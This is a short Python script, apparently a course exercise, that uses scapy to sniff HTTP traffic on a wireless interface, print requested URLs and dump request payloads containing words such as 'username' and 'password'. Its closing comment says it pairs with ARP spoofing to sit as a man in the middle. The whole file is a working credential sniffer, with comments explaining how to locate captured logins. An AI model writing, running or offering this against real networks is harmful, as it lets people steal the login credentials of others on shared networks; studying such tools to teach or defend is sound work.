import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # store=False: Dont store anything in memory, prn calls another function every time a packet is captured
    #Can use filter=udp(or tcp or port 21 or port 80 etc). http based filtering not allowed unfortunately

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): # Can also check for tcp or other layers
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path # The url is partially present in host and path fields of http layer
        print("[+] HTTP request >>" + str(url)) # url is a byte object. Need to convert it to string


        if packet.haslayer(scapy.Raw):
            #print(packet.show()) # packet.show() will show all the layers in the packets as well as the fields set
            # Use packet.show() to find the layer which has the info you're looking for. Like the layer "raw" has the usernames and passwords in its load field
            # However this load field is used by other websites to send other data as well, so it's better to cross check using keywords for the presence of usernames, passwords
            # print(packet[scapy.Raw].load) # We get the usernames and passwords in output
            load_field = packet[scapy.Raw].load # Again a byte object
            keywords=["username", "user", "password", "pass", "login"] # Various keywords in the load field in which the usernames and passwords may be sent
            for keyword in keywords:
                if keyword in str(load_field):
                    print("\n\n [+] Possible username, password entered >>"+ str(load_field) + "\n\n")
                    break


sniff("wlan0")
# The sniffer analyzes the data flowing through wlan0. arp-spoof does all the hard work of making the data flow through wlan0 when we're the man in the middle.